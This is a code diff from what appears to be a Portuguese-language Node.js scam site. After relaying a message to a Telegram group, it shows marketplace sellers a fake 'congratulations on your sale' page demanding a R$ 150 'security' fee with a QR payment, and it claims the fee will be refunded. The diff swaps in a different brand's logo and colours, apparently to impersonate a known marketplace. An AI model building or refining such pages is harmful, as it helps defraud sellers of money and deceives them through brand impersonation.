@@ -895,12 +895,16 @@ app.post('/confirmar', async (req, res) => {
     try {
         await bot.telegram.sendMessage(GROUP_CHAT_ID, mensagem, { parse_mode: 'Markdown' });
         res.send(`
+
+            
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Pagamento da Taxa</title>
+        <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='30' height='30' viewBox='0 0 968.19 513'%3E%3Cpath d='M183.46,423.61c-55.23,0-93.32-46.27-93.32-114.69,0-69.09,38.09-115.36,93.32-115.36s93.31,46.27,93.31,114.7c0,69.08-38.09,115.35-93.31,115.35m0,86.69c102.2,0,183.45-86,183.45-202,0-114.7-76.81-201.38-183.45-201.38C81.25,106.88,0,192.91,0,308.92,0,425.57,76.81,510.3,183.46,510.3' fill='%236e0ad6' fill-rule='evenodd'/%3E%3Cpath d='M442.45,356.49H617.66c12.06,0,19-7.17,19-19.56V280.24c0-12.38-7-19.55-19-19.55H500.22V19.55c0-12.38-7-19.55-19-19.55H423.41c-12.06,0-19,7.17-19,19.55V317.39c0,25.41,13.33,39.1,38.08,39.1' fill='%238ce563' fill-rule='evenodd'/%3E%3Cpath d='M680.51,504.42,785.88,380l102.2,124.47c8.89,11.09,20.32,11.09,30.47,2l41.27-37.15c10.15-9.12,11.42-20.85,1.9-31.28L848.09,307.61,951.56,188.34c8.89-10.42,8.26-21.51-1.9-31.28l-38.72-35.84c-10.16-9.78-21.59-9.13-30.48,2L785.88,235.92,689.39,123.17c-8.88-10.43-20.31-11.73-30.47-2l-40,36.49c-10.16,9.78-10.79,20.21-1.27,31.28L723,308.26l-114.9,131c-9.53,11.07-8.26,22.15,1.9,31.28l40,35.84c10.16,9.13,21.59,8.47,30.47-2' fill='%23f28000' fill-rule='evenodd'/%3E%3C/svg%3E">
+
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 </head>
@@ -964,15 +968,16 @@ app.post('/confirmar', async (req, res) => {
 
    </style>
     <header>
-        <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="none"> <path fill="#61005D" fill-rule="evenodd" d="M1.25 14.19C1.25 5.845 6.813-.005 15.002-.005s13.752 5.85 13.741 14.193c0 .96-.033 1.943-.143 2.749H1.393c-.11-.806-.143-1.8-.143-2.749m20.485-2.197c-.343-4.348-3.135-6.147-6.733-6.147s-6.39 1.799-6.733 6.147zM8.093 20.37c1.644 2.45 3.874 3.763 6.909 3.763s5.265-1.313 6.91-3.763l5.198 3.002c-2.561 5.088-7.428 6.622-12.108 6.622S5.455 28.46 2.894 23.372z" clip-rule="evenodd"></path> </svg>    </header>
-    <div class="min-h-screen flex items-center justify-center p-4">
-        <div class="bg-white shadow-lg rounded-2xl p-6 max-w-lg w-full border-t-4 border-purple-500">
-            <h2 class="text-xl font-bold text-purple-700 mb-4">Parabéns pela venda!</h2>
+        <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 968.19 513"><path d="M183.46,423.61c-55.23,0-93.32-46.27-93.32-114.69,0-69.09,38.09-115.36,93.32-115.36s93.31,46.27,93.31,114.7c0,69.08-38.09,115.35-93.31,115.35m0,86.69c102.2,0,183.45-86,183.45-202,0-114.7-76.81-201.38-183.45-201.38C81.25,106.88,0,192.91,0,308.92,0,425.57,76.81,510.3,183.46,510.3" fill="#6e0ad6" fill-rule="evenodd"/><path d="M442.45,356.49H617.66c12.06,0,19-7.17,19-19.56V280.24c0-12.38-7-19.55-19-19.55H500.22V19.55c0-12.38-7-19.55-19-19.55H423.41c-12.06,0-19,7.17-19,19.55V317.39c0,25.41,13.33,39.1,38.08,39.1" fill="#8ce563" fill-rule="evenodd"/><path d="M680.51,504.42,785.88,380l102.2,124.47c8.89,11.09,20.32,11.09,30.47,2l41.27-37.15c10.15-9.12,11.42-20.85,1.9-31.28L848.09,307.61,951.56,188.34c8.89-10.42,8.26-21.51-1.9-31.28l-38.72-35.84c-10.16-9.78-21.59-9.13-30.48,2L785.88,235.92,689.39,123.17c-8.88-10.43-20.31-11.73-30.47-2l-40,36.49c-10.16,9.78-10.79,20.21-1.27,31.28L723,308.26l-114.9,131c-9.53,11.07-8.26,22.15,1.9,31.28l40,35.84c10.16,9.13,21.59,8.47,30.47-2" fill="#f28000" fill-rule="evenodd"/></svg>
+                </header>
+        <div class="min-h-screen flex items-center justify-center p-4">
+        <div class="bg-white shadow-lg rounded-2xl p-6 max-w-lg w-full border-t-4 border-orange-500">
+            <h2 class="text-xl font-bold text-orange-700 mb-4">Parabéns pela venda!</h2>
             <p class="text-gray-700 mb-3">No entanto, você ainda não atingiu a pontuação necessária como vendedor em nossa plataforma. Para garantir a segurança de todos, implementamos uma política para prevenir fraudes e garantir que somente vendedores confiáveis possam concluir transações.</p>
-            <h3 class="text-lg font-bold text-purple-500 mb-2">Taxa de Comissão para Garantia de Segurança</h3>
+            <h3 class="text-lg font-bold text-orange-500 mb-2">Taxa de Comissão para Garantia de Segurança</h3>
             <p class="text-gray-700 mb-3">Por questão de segurança e para garantir que você realmente deseja vender seu produto, será cobrada uma taxa de comissão. Esta taxa ajuda a validar o processo e evitar fraudes em nosso sistema. Não se preocupe, esse valor será devolvido junto com o valor da sua venda!</p>
-            <p class="text-gray-900 font-semibold mb-3">Taxa de Ativação: <span class="text-purple-500">R$ 150,00</span></p>
-            <button id="btnPagar" class="bg-purple-500 text-white px-4 py-2 rounded-lg w-full mt-4 hover:bg-purple-600">Pagar Taxa</button>
+            <p class="text-gray-900 font-semibold mb-3">Taxa de Ativação: <span class="text-orange-500">R$ 150,00</span></p>
+            <button id="btnPagar" class="bg-green-500 text-white px-4 py-2 rounded-lg w-full mt-4 hover:bg-green-600">Pagar Taxa</button>
         </div>
     </div>
 
@@ -1252,7 +1257,7 @@ app.get('/analise', async (req, res) => {
                         border-radius: 10px;
                     }
                     h1 {
-                        color: #61005E;
+                        color:rgb(3, 97, 0);
                         font-size: 24px;
                     }
                     p {
@@ -1263,7 +1268,7 @@ app.get('/analise', async (req, res) => {
                         display: inline-block;
                         margin-top: 15px;
                         padding: 10px 20px;
-                        background-color: #61005E;
+                        background-color:rgb(250, 194, 38);
                         color: white;
                         text-decoration: none;
                         font-size: 16px;
@@ -1271,7 +1276,7 @@ app.get('/analise', async (req, res) => {
                         transition: 0.3s;
                     }
                     .btn:hover {
-                        background-color: #95008e;
+                        background-color:rgb(252, 193, 33);
                     }
                 </style>
             </head>
